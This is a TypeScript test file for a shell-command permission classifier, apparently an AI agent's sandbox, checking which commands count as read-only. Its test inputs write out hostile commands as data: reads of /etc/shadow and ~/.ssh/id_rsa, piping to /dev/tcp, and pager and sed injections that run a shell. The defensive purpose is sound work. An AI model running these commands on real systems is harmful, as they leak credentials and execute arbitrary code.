/**
 * Review cases for the argv read-only port: things the argv allow-list alone
 * would pass but the Xueness classifier must still ask about.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { classifyShellCommand, commandMatches, PermissionSession, type PermissionRequest } from "../src/index.ts";

const exec = (subject: string): PermissionRequest => ({ tool: "exec", kind: "exec", subject, subjectKind: "command" });

describe("read-only review", () => {
  it("guards the command behind command/builtin/noglob like the bare command", () => {
    for (const line of [
      "command sed '1e touch x' f", "noglob sed 'e ls' f", "builtin sed -n 'w out' f", "command uniq a out",
      "command cat /etc/shadow", "command -p cat /etc/passwd", "command -- head ../secret", "noglob cat ~/.ssh/id_rsa",
      "command grep x /etc/passwd", "command cd /", "noglob ls *", "command find . -delete", "command sort -o out f",
      "command tree -R", "command rg --pre=sh x", "command git -c core.pager=sh log", "command date -s 2020-01-01",
    ]) assert.equal(classifyShellCommand(line).readOnly, false, line);
    for (const line of ["command grep -n foo src", "noglob grep -R foo src", "command -v node", "builtin pwd"]) {
      assert.equal(classifyShellCommand(line).readOnly, true, line);
    }
  });

  it("asks for xargs, whose arguments come from input and escape the workspace check", () => {
    for (const line of ["xargs head", "echo ~/.ssh/id_rsa | xargs head", "git ls-files | xargs grep foo", "xargs -I{} head {}"]) {
      assert.equal(classifyShellCommand(line).readOnly, false, line);
    }
  });

  it("asks for input redirections from outside the workspace", () => {
    for (const line of ["cat < /etc/passwd", "head < ~/.ssh/id_rsa", "grep x < ../secret", "sort 0< /etc/shadow"]) {
      assert.equal(classifyShellCommand(line).readOnly, false, line);
    }
    for (const line of ["cat < README.md", "grep x < src/a.ts", "cat < /dev/null", "cat <<< /etc/passwd"]) {
      assert.equal(classifyShellCommand(line).readOnly, true, line);
    }
  });

  it("keeps writers, runners and substitutions out", () => {
    for (const line of [
      "find . -name x -delete", "find . -exec rm {} \\;", "find . -fprint out", "find . -fls out", "find . -files0-from list",
      "sed -i s/a/b/ f", "sed --in-place s/a/b/ f", "sed 's/a/b/w out' f", "sed 's/a/b/e' f", "sed -E -i s/a/b/ f",
      "echo x > out", "echo x >> out", "echo x >| out", "echo x &> out", "echo x >& out", "cat f 3>out", "cat <> f",
      "cat f > /dev/tcp/1.1.1.1/80", "cat < /dev/tcp/1.1.1.1/80", "echo $(rm x)", "echo `rm x`", "cat <(rm x)",
      "git status $(touch x)", "ls | sh", "ls | tee out", "ls && rm x", "git push", "git stash", "git branch x",
      "git tag v1", "git config user.name x", "git log --output=out", "git diff --ext-diff", "git grep -O x",
      "git archive -o out HEAD", "git -C .. status", "cd src && git status", "GIT_PAGER=sh git log", "PAGER=sh git log",
      "gh api -X POST /x", "gh pr merge 1", "docker run alpine", "docker -H tcp://x ps", "sort -uo out f",
      "tree -o out", "file -C", "rg --pre sh x", "fd -x rm", "date -s 2020", "hostname evil", "man -P 'sh -c id' ls",
      "history -c", "printf -v x y", "ss -K dst 1.1.1.1",
    ]) assert.equal(classifyShellCommand(line).readOnly, false, line);
  });
});

describe("rule matching review", () => {
  const words = (line: string): string[] => line.split(" ");
  it("keeps wildcards inside prefix rules", () => {
    assert.equal(commandMatches("git * push *", words("git -C x push origin")), true);
    assert.equal(commandMatches("* --force *", words("git commit --force x")), true);
    assert.equal(commandMatches("timeout * rm *", words("timeout 5 rm x")), true);
    assert.equal(commandMatches("git * push *", words("git -C x pull")), false);
  });

  it("denies a program by path but never allows one by its base name", () => {
    assert.equal(new PermissionSession({ mode: "build", deny: ["exec(rm *)"] }).check(exec("/bin/rm x")).behavior, "deny");
    assert.equal(new PermissionSession({ mode: "build", deny: ["exec(git * push *)"] }).check(exec("git -C x push origin")).behavior, "deny");
    assert.equal(new PermissionSession({ mode: "build", allow: ["exec(rm *)"] }).check(exec("./rm x")).behavior, "ask");
    assert.equal(new PermissionSession({ mode: "build", allow: ["exec(rm *)"] }).check(exec("rm x")).behavior, "allow");
  });
});
